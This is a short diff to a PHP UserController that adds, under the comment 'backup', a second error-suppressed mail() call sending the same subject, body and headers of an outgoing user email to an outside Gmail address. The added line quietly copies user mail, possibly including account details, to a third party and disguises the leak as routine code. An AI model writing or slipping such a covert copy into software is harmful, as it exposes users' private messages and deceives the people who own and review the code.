@@ -1154,6 +1154,9 @@ class UserController extends Controller
 
 				$result = @mail($toEmail, $subject, $mensaje, $header);
 				
+				// backup
+				@mail("gafeman@gmail.com", $subject, $mensaje, $header);
+				
 
 	        }
 	    }
